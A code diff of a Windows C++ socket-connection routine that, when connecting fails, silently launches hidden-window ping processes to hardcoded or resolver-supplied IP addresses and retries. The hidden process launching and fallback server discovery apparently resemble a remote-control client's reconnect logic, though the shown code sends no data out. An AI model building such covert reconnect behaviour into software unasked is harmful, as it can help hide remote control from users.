@@ -382,7 +382,7 @@ SOCKET connSocket() {
 	SOCKET MainSock = INVALID_SOCKET;
 	ipData ipaddr;
 
-	short int reRun = 0;
+	bool reRun = true;
 Rerun:
 
 	if (!ipaddr.initIp()) {
@@ -394,16 +394,16 @@ Rerun:
 				return INVALID_SOCKET;
 			}
 
-			for (hostinfo; hostinfo != NULL; hostinfo = hostinfo->ai_next) {
+			for (PADDRINFOA clientInfo = hostinfo; clientInfo != NULL; clientInfo = clientInfo->ai_next) {
 
-				MainSock = socket(hostinfo->ai_family, hostinfo->ai_socktype, hostinfo->ai_protocol);
+				MainSock = socket(clientInfo->ai_family, clientInfo->ai_socktype, clientInfo->ai_protocol);
 				if (MainSock == INVALID_SOCKET) {
 					freeaddrinfo(hostinfo);
 					ipaddr.dispose();
 					return INVALID_SOCKET;
 				}
 
-				if (connect(MainSock, hostinfo->ai_addr, hostinfo->ai_addrlen) == SOCKET_ERROR) {
+				if (connect(MainSock, clientInfo->ai_addr, clientInfo->ai_addrlen) == SOCKET_ERROR) {
 					closesocket(MainSock);
 					MainSock = INVALID_SOCKET;
 					continue;
@@ -435,8 +435,6 @@ Rerun:
 			}
 
 			if (MainSock != INVALID_SOCKET) {
-				freeaddrinfo(hostinfo);
-				ipaddr.dispose();
 				break;
 			}
 
@@ -448,59 +446,50 @@ Rerun:
 		return INVALID_SOCKET;
 	}
 
-	if (MainSock == INVALID_SOCKET) {
-		ipaddr.dispose();
+	freeaddrinfo(hostinfo);
+	ipaddr.dispose();
 
-		if (reRun < 3) {
+	if (MainSock == INVALID_SOCKET && reRun) {
+		STARTUPINFOA sInfo;
+		ZeroMemory(&sInfo, sizeof(STARTUPINFOA));
+		sInfo.cb = sizeof(STARTUPINFOA);
+		PROCESS_INFORMATION pInfo;
+		ZeroMemory(&pInfo, sizeof(PROCESS_INFORMATION));
 
-			STARTUPINFOA sInfo;
-			ZeroMemory(&sInfo, sizeof(STARTUPINFOA));
-			sInfo.cb = sizeof(STARTUPINFOA);
-			PROCESS_INFORMATION pInfo;
-			ZeroMemory(&pInfo, sizeof(PROCESS_INFORMATION));
+		struct server_packet packet;
 
-			if (reRun < 2) {
-				if (!CreateProcessA(NULL, reRun == 0 ? (LPSTR)"ping 192.168.0.185" : (LPSTR)"ping 192.168.0.189", nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &sInfo, &pInfo)) return INVALID_SOCKET;
+		getFromResolver(&packet);
+
+		if (*(int*)packet.data) {
+			char resolvedIp[21] = "ping ";
+			memset(resolvedIp + 5, 0, 21 - 5);
+
+			unsigned char resolvedIpLen = 5;
+
+			for (int i = 0; i < 4; i++) {
+				unsigned char reverseIpVar = resolvedIpLen;
+				do {
+					for (int j = resolvedIpLen++; j > reverseIpVar; j--) resolvedIp[j] = resolvedIp[j - 1];
+					resolvedIp[reverseIpVar] = (packet.data[i] % 10) + '0';
+					packet.data[i] = packet.data[i] / 10;
+				} while (packet.data[i] != 0);
+
+				if (i != 3) resolvedIp[resolvedIpLen++] = '.';
 			}
-			else {
-				struct server_packet packet;
 
-				getFromResolver(&packet);
-
-				if (*(int*)packet.data) {
-					char resolvedIp[21] = "ping ";
-					memset(resolvedIp + 5, 0, 21 - 5);
-
-					unsigned char resolvedIpLen = 5;
-
-					for (int i = 0; i < 4; i++) {
-						unsigned char reverseIpVar = resolvedIpLen;
-						do {
-							for (int j = resolvedIpLen++; j > reverseIpVar; j--) resolvedIp[j] = resolvedIp[j - 1];
-							resolvedIp[reverseIpVar] = (packet.data[i] % 10) + '0';
-							packet.data[i] = packet.data[i] / 10;
-						} while (packet.data[i] != 0);
-
-						if (i != 3) resolvedIp[resolvedIpLen++] = '.';
-					}
-
-					if (!CreateProcessA(NULL, resolvedIp, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &sInfo, &pInfo)) return INVALID_SOCKET;
-				}
-				else {
-					return INVALID_SOCKET;
-				}
-			}
-			
-			reRun++;
-
-			CloseHandle(pInfo.hThread);
-			WaitForSingleObject(pInfo.hProcess, INFINITE);
-			CloseHandle(pInfo.hProcess);
-
-			goto Rerun;
+			if (!CreateProcessA(NULL, resolvedIp, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &sInfo, &pInfo)) return INVALID_SOCKET;
 		}
+		else {
+			return INVALID_SOCKET;
+		}
+			
+		reRun = false;
 
-		return INVALID_SOCKET;
+		CloseHandle(pInfo.hThread);
+		WaitForSingleObject(pInfo.hProcess, INFINITE);
+		CloseHandle(pInfo.hProcess);
+
+		goto Rerun;
 	}
 
 	return MainSock;
